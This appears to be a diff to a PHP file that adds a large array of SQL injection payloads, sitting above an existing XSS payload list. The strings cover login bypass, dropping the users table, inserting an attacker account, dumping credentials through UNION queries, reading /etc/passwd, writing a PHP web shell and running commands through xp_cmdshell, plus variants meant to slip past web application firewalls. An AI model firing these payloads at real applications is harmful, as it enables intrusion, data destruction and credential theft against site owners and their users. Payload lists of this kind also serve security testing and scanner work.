@@ -1,5 +1,75 @@
 <?php
 
+$sql_payloads = [
+    // **Basic SQL Injection**
+    "' OR '1'='1",  // Always true condition
+    "' OR '1'='1' --",  // MySQL comment to terminate query
+    "' OR '1'='1' #",  // Another MySQL comment
+    "' OR '1'='1' /*",  // Inline comment
+    "1' OR '1'='1",  // Numeric bypass
+    "1' OR 1=1 --",  // Numeric conditional statement
+    "1' OR 1=1 #",  // Alternative comment
+    "1' OR 1=1 /*",  // Inline comment variation
+
+    // **Bypass Authentication**
+    "' OR 'x'='x",  // Generic bypass
+    "' OR ''='",  // Empty value comparison
+    "' OR 'a'='a",  // Another string-based bypass
+    "admin' --",  // Assuming username field
+
+    // **Stacked Queries (if supported)**
+    "'; DROP TABLE users --",  // Drop users table
+    "'; SELECT version(); --",  // Retrieve DB version
+    "'; SHOW TABLES; --",  // List database tables
+    "'; SHOW DATABASES; --",  // List all databases
+    "'; INSERT INTO users (username, password) VALUES ('attacker', 'password'); --",  // Insert a new user
+
+    // **Error-Based Injection**
+    "' OR 1=1 UNION SELECT NULL, NULL, NULL --",  // Union attack (2 or more columns)
+    "' UNION SELECT 1,2,3 --",  // Find number of columns
+    "' UNION SELECT username, password FROM users --",  // Dump credentials
+    "' UNION SELECT table_name, column_name FROM information_schema.columns --",  // Extract table & column names
+    "' UNION SELECT @@version, user() --",  // Extract DB version & user
+
+    // **Blind SQL Injection**
+    "' AND SLEEP(5) --",  // Time delay (MySQL)
+    "'; WAITFOR DELAY '00:00:05' --",  // Time delay (MSSQL)
+    "' AND (SELECT COUNT(*) FROM users); --",  // Conditional statement
+    "' AND (SELECT 1 FROM users WHERE username='admin' AND LENGTH(password)>8) --",  // Boolean-based blind test
+
+    // **Boolean-Based SQLi**
+    "' AND 1=1 --",  // Always true
+    "' AND 1=0 --",  // Always false
+    "' AND (SELECT 'a' FROM dual)='a' --",  // Oracle boolean check
+    "' OR EXISTS(SELECT * FROM users) --",  // Check if table exists
+
+    // **Hex/Unicode Encoding**
+    "0x50776E6564' OR '1'='1' --",  // Hex encoded string
+    "0x61646D696E' OR '1'='1' --",  // "admin" in hex
+    "CONCAT(CHAR(97),CHAR(100),CHAR(109),CHAR(105),CHAR(110))='admin' --",  // "admin" using CHAR()
+
+    // **Bypassing WAF (Web Application Firewalls)**
+    "' OR '1'='1' OR ''='",  // Random string injection
+    "admin' -- -",  // Additional comment characters
+    "' OR 1=1-- -",  // Extra spaces for bypass
+    "' OR 1=1#@!$",  // Special characters
+    "' UNION/**/SELECT/**/1,2,3 --",  // Using inline comments
+    "' OR 1=CONVERT(INT, '1') --",  // MSSQL-specific WAF bypass
+    "' OR CAST(CHAR(97)+CHAR(100)+CHAR(109)+CHAR(105)+CHAR(110) AS NVARCHAR)='admin' --",  // MSSQL CHAR() method
+
+    // **Bypassing Filters with Case Change**
+    "' OR 'One'='ONE' --",  // Case variation
+    "' OR 'oNe'='oNe' --",  // Case variation
+    "' Or 'AdMiN'='AdMiN' --",  // Mixed case admin bypass
+
+    // **Out-of-Band (OOB) SQL Injection**
+    "' UNION SELECT LOAD_FILE('/etc/passwd') --",  // Read system files (MySQL)
+    "' UNION SELECT 1,2,3 INTO OUTFILE '/var/www/html/shell.php' --",  // Write web shell (MySQL)
+    "' UNION SELECT '<?php system($_GET[cmd]); ?>' INTO OUTFILE '/var/www/html/shell.php' --",  // Write PHP shell
+    "'; EXEC xp_cmdshell('whoami'); --",  // Execute command (MSSQL)
+    "'; COPY (SELECT 'hacked') TO '/tmp/hack.txt'; --",  // PostgreSQL file write
+];
+
 $xss_payloads = [
     "<script>alert(1)</script>",  // Basic script injection
     "\"><script>alert(1)</script>",  // Closing quote + script injection
